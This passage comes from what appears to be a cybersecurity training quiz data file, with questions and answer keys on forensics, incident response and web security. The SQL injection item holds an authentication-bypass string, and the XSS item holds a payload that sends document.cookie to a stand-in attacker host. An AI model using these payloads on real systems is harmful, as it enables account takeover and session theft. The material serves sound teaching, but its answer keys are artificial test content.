      topic: 'Evidence Preservation',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'SHORT_ANSWER',
      scenario: 'During an incident response engagement on a live compromised server, a technician recommends cutting the master power cord immediately to stop the attacker. The lead forensic investigator orders: "Hold power! Dump volatile memory first in accordance with RFC 3227."',
      question: 'Enter the 3-letter acronym for the volatile physical memory that loses all data when powered down and must be imaged first.',
      primaryAnswer: 'RAM',
      acceptableVariants: ['RAM', 'ram', 'Ram', 'VOLATILE RAM', 'RANDOM ACCESS MEMORY'],
      explanation: 'Under the Order of Volatility (RFC 3227), Random Access Memory (RAM) must be acquired before powering off, as it contains injected malware binaries, unencrypted cryptographic keys, active process trees, and established network sockets.',
      hint: {
        text: '3 letters: The computer memory that requires continuous electric power to retain stored data (Random Access Memory).',
        penalty: 2
      },
      successMessage: 'EVIDENCE INTEGRITY PRESERVED: Volatile memory prioritized.',
      retryMessage: 'INCORRECT ACRONYM: Enter the standard 3-letter acronym for volatile system memory.'
    },
    {
      id: 'Q_HASH_12',
      room: 'charlie',
      roomName: 'SOC Forensics & Incident Response',
      topic: 'SHA-256 Hash Verification',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'A network engineer downloads an operating system update ISO. The vendor publishes official SHA-256 hash:\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nThe engineer runs "sha256sum" on the downloaded ISO and obtains:\na85f3922d41b6c0082f913d800a7516e8b4e76a6e0c704f056d68b753a473e12',
      question: 'What does this cryptographic hash mismatch prove beyond doubt?',
      options: [
        { id: 'A', label: 'A', text: 'The download completed faster than normal bandwidth limits.' },
        { id: 'B', label: 'B', text: 'The downloaded file is corrupted or has been tampered with; it is unsafe and must NOT be installed.' },
        { id: 'C', label: 'C', text: 'The engineer executed the hashing tool using the wrong user privileges.' },
        { id: 'D', label: 'D', text: 'SHA-256 hashes routinely change based on the date and time of the download.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Cryptographic hash functions are deterministic digital fingerprints with high avalanche effect. A mismatch proves that the binary differs from the authentic image, indicating network transmission corruption or malware tampering.',
      hint: {
        text: 'A cryptographic hash is a unique digital fingerprint; if two hashes do not match, the contents are not identical.',
        penalty: 1
      },
      successMessage: 'INTEGRITY VERIFICATION COMPLETE: Tampered binary rejected before execution.',
      retryMessage: 'INCORRECT CONCLUSION: Never execute binaries whose hashes do not match vendor-provided checksums.'
    },
    {
      id: 'Q_CONTAIN_12',
      room: 'charlie',
      roomName: 'SOC Forensics & Incident Response',
      topic: 'Incident Containment Procedures',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'An Advanced Persistent Threat (APT) has compromised three workstations in the engineering lab and stolen service account credentials. Under NIST SP 800-61 Rev. 2, the incident commander must execute containment before remediation.',
      question: 'Which containment procedure isolates the adversary while ensuring volatile evidence is not destroyed and legal forensic admissibility is preserved?',
      options: [
        { id: 'A', label: 'A', text: 'Immediately reformat all hard drives and reinstall Windows from an unverified USB drive.' },
        { id: 'B', label: 'B', text: 'Isolate compromised hosts logically via network switch VLAN quarantine or EDR host isolation, dump volatile memory, and revoke compromised service account tokens.' },
        { id: 'C', label: 'C', text: 'Broadcast an unencrypted email warning all campus users to turn off their smartphones.' },
        { id: 'D', label: 'D', text: 'Delete all Active Directory event logs to reset the incident telemetry dashboard.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Under NIST SP 800-61, containment prevents expansion of the incident without destroying critical forensic evidence. Logical network isolation keeps systems powered on for memory capture while severing attacker C2 communication.',
      hint: {
        text: 'Containment must prevent lateral movement without destroying volatile RAM evidence or prematurely wiping drives.',
        penalty: 2
      },
      successMessage: 'INCIDENT CONTAINMENT CERTIFIED: Logical isolation and token revocation executed.',
      retryMessage: 'INCORRECT CONTAINMENT: Hard drive wiping or powering off destroys critical volatile evidence.'
    },

    // -------------------------------------------------------------------------
    // ROOM DELTA: APPLICATION AND NETWORK SECURITY (6 Questions)
    // -------------------------------------------------------------------------
    {
      id: 'Q_NET_15',
      room: 'delta',
      roomName: 'Application & Network Security',
      topic: 'Secure HTTP and HTTPS',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'An Nmap vulnerability scan of an internal server displays open listening ports: 21 (FTP), 23 (Telnet), 80 (HTTP), and 443 (HTTPS).',
      question: 'Which of these protocols transmit authentication credentials and session data in unencrypted plaintext across the local network?',
      options: [
        { id: 'A', label: 'A', text: 'Only Port 443' },
        { id: 'B', label: 'B', text: 'Ports 21 (FTP), 23 (Telnet), and 80 (HTTP) transmit plaintext and should be upgraded to SFTP (22), SSH (22), and HTTPS (443).' },
        { id: 'C', label: 'C', text: 'All TCP network traffic is automatically encrypted by network switches.' },
        { id: 'D', label: 'D', text: 'Only Port 21 (FTP)' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'FTP (21), Telnet (23), and HTTP (80) transmit all commands, usernames, and passwords in cleartext without TLS/SSL encryption, allowing network eavesdroppers using tools like Wireshark to intercept credentials.',
      hint: {
        text: 'Which protocols lack modern transport layer encryption? (Notice the absence of SSH or TLS wrappers).',
        penalty: 1
      },
      successMessage: 'CLEARTEXT PROTOCOLS IDENTIFIED: Migration to encrypted protocols (SSH/SFTP/HTTPS) enforced.',
      retryMessage: 'INCORRECT PROTOCOL ASSESSMENT: Legacy protocols transmit passwords in clear, human-readable text over the wire.'
    },
    {
      id: 'Q_FW_17',
      room: 'delta',
      roomName: 'Application & Network Security',
      topic: 'Firewall & Network Traffic Analysis',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'Internal firewall egress logs show an isolated database server attempting outbound TCP connections to an unknown external IP on port 4444 at regular 30-second intervals with identical 128-byte packet payloads.',
      question: 'What category of malicious traffic profile does this periodic, regular network communication represent?',
      options: [
        { id: 'A', label: 'A', text: 'Standard NTP clock synchronization.' },
        { id: 'B', label: 'B', text: 'Command and Control (C2) beaconing / reverse shell heartbeat.' },
        { id: 'C', label: 'C', text: 'DNS root zone authoritative zone transfer.' },
        { id: 'D', label: 'D', text: 'Local ARP broadcast discovery.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B', 'C2', 'BEACONING'],
      explanation: 'Periodic, fixed-interval outbound connections from internal servers to external IPs on non-standard ports (such as Metasploit default port 4444) are classic indicators of Command and Control (C2) beaconing.',
      hint: {
        text: 'Regular pulses sent from infected machines to an attacker server to request instructions are called C2 b____oning.',
        penalty: 1
      },
      successMessage: 'C2 BEACONING DETECTED: Outbound reverse shell beacon isolated and egress blocked.',
      retryMessage: 'INCORRECT TRAFFIC CLASSIFICATION: Fixed-interval outbound traffic on port 4444 indicates C2 beaconing.'
    },
    {
      id: 'Q_PRIV_18',
      room: 'delta',
      roomName: 'Application & Network Security',
      topic: 'Least Privilege and Access Control',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'When querying student records in a web application, the URL is `https://portal.kluniv.in/api/student?id=1042`. Changing the parameter to `id=1043` immediately returns another student\'s full grades and disciplinary records without requiring authorization.',
      question: 'What access control vulnerability is present, and what core architectural principle does it violate?',
      options: [
        { id: 'A', label: 'A', text: 'Buffer overflow; violates stack canary enforcement.' },
        { id: 'B', label: 'B', text: 'Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA); violates server-side authorization enforcement and the Principle of Least Privilege.' },
        { id: 'C', label: 'C', text: 'Server-Side Request Forgery (SSRF); violates internal loopback filtering.' },
        { id: 'D', label: 'D', text: 'Clickjacking; violates X-Frame-Options framing.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B', 'IDOR', 'BOLA'],
      explanation: 'Insecure Direct Object References (IDOR/BOLA) occur when an application provides direct access to objects based on user-supplied input without server-side validation that the authenticated user possesses legitimate permissions for that specific resource.',
      hint: {
        text: 'Accessing another user\'s records simply by changing the ID in the URL is an Insecure Direct Object Reference (IDOR).',
        penalty: 1
      },
      successMessage: 'ACCESS CONTROL FLAW ISOLATED: IDOR / BOLA identified and server-side RBAC validation enforced.',
      retryMessage: 'INCORRECT ACCESS CONTROL: Changing identifier parameters to view unauthorized records is an IDOR vulnerability.'
    },
    {
      id: 'Q_SQLI_13',
      room: 'delta',
      roomName: 'Application & Network Security',
      topic: 'SQL Injection Detection',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'An audit of a legacy PHP student portal reveals the following authentication backend logic:\n$query = "SELECT * FROM users WHERE username = \'" . $_POST[\'user\'] . "\' AND pass = \'" . $_POST[\'pass\'] . "\'";\nAn attacker enters: \' OR \'1\'=\'1\' -- in the username field.',
      question: 'Why does this input bypass password verification, and what is the definitive programmatic defense?',
      options: [
        { id: 'A', label: 'A', text: 'It overflows the database buffer; the defense is allocating more RAM to MySQL.' },
        { id: 'B', label: 'B', text: 'The injection alters the SQL syntax logic making the WHERE clause universally true while commenting out the password check; the defense is using Parameterized Queries (Prepared Statements).' },
        { id: 'C', label: 'C', text: 'It encodes the database tables in Base64; the defense is disabling UTF-8 character sets.' },
        { id: 'D', label: 'D', text: 'It exploits a Cross-Site Request Forgery; the defense is issuing CSRF anti-tamper tokens.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'SQL Injection exploits raw string concatenation of untrusted user input into database queries. Parameterized queries / prepared statements treat input strictly as parameter data rather than executable SQL commands.',
      hint: {
        text: 'Notice how the injected string changes SQL boolean logic to true and uses comment dashes (--) to ignore the password condition. Prepared Statements are the cure.',
        penalty: 2
      },
      successMessage: 'SQLI DEFENSE CONFIRMED: Parameterized query architecture validated.',
      retryMessage: 'INCORRECT VULNERABILITY ANALYSIS: Review how string concatenation into SQL commands creates syntax manipulation vulnerabilities.'
    },
    {
      id: 'Q_XSS_14',
      room: 'delta',
      roomName: 'Application & Network Security',
      topic: 'Cross-Site Scripting (XSS)',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'A student profile page renders bio comments without sanitization:\n<div id="bio">" + userComment + "</div>\nAn attacker posts: <img src="x" onerror="fetch(\'https://attacker-logger.net/leak?c=\' + document.cookie)">',
      question: 'What vulnerability category is present, and what is the primary consequence when other students visit this profile?',
      options: [
        { id: 'A', label: 'A', text: 'Stored Cross-Site Scripting (Stored XSS); the script executes in visiting victims\' browsers, exfiltrating their session authentication cookies to the attacker.' },
        { id: 'B', label: 'B', text: 'SQL Injection; the attacker gains direct root shell access to the web server.' },
        { id: 'C', label: 'C', text: 'Distributed Denial of Service; the database runs out of disk space.' },
        { id: 'D', label: 'D', text: 'Path Traversal; the attacker reads the /etc/shadow file directly.' }
      ],
      primaryAnswer: 'A',
      acceptableVariants: ['A', 'a', 'OPTION A'],
      explanation: 'Stored XSS occurs when unescaped HTML/JavaScript is persisted on a server and rendered in the browsers of visiting users. The script runs in the security context of the victim, enabling session token exfiltration and account hijacking.',
      hint: {
        text: 'The script is stored on the page and runs in the victim browser context to read document.cookie.',
        penalty: 2
      },
      successMessage: 'XSS VULNERABILITY ISOLATED: Output encoding and context sanitization required.',
      retryMessage: 'INCORRECT CATEGORY: Notice that malicious JavaScript is executing on the client browser.'
    },
    {
      id: 'Q_DNS_16',
      room: 'delta',
      roomName: 'Application & Network Security',
      topic: 'DNS Poisoning & DNSSEC',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'A threat actor on a local network segment injects forged DNS response packets into a caching resolver, redirecting users navigating to "portal.kluniversity.in" to a phishing server IP.',
      question: 'What security extension protocol uses public-key cryptography to digitally sign DNS resource records, preventing DNS spoofing and cache poisoning?',
      options: [
        { id: 'A', label: 'A', text: 'DNSSEC (Domain Name System Security Extensions)' },
        { id: 'B', label: 'B', text: 'DHCP Snooping' },
        { id: 'C', label: 'C', text: 'Dynamic ARP Inspection (DAI)' },
        { id: 'D', label: 'D', text: 'BGP Anycast' }
      ],
      primaryAnswer: 'A',
      acceptableVariants: ['A', 'a', 'OPTION A', 'DNSSEC'],
      explanation: 'DNSSEC (Domain Name System Security Extensions) provides cryptographic authentication of DNS data through digital signatures (RRSIG records) and an authenticated chain of trust, preventing DNS cache poisoning.',
      hint: {
        text: 'Look for the standard protocol that adds "Security Extensions" directly to DNS.',
        penalty: 2
      },
      successMessage: 'DNSSEC VERIFICATION CONFIRMED: Cryptographic domain validation operational.',
      retryMessage: 'INCORRECT PROTOCOL: Look for the suite specifically designed to cryptographically sign DNS records.'
    }
  ]
};
